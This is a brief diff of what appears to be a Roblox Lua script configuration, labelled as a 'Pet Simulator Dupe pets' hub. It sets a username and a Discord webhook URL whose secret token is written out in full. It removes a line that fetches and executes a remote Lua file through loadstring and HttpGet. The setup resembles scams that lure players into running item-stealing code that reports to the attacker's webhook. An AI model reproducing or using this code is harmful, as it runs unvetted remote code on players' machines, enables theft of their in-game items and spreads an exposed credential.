@@ -1,4 +1,3 @@
 _G.Username = eltrol123XD
 _G.HubName = Pet Simulator Dupe pets
 _G.WebhookUrl =  https://discord.com/api/webhooks/1097195161328553985/D4VhCfy5jntqcu_R817NBMs-r4uo3Xm1sfNUwiPg3-b-6rn7sADYeyVj5Spl3ZbSxCci
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
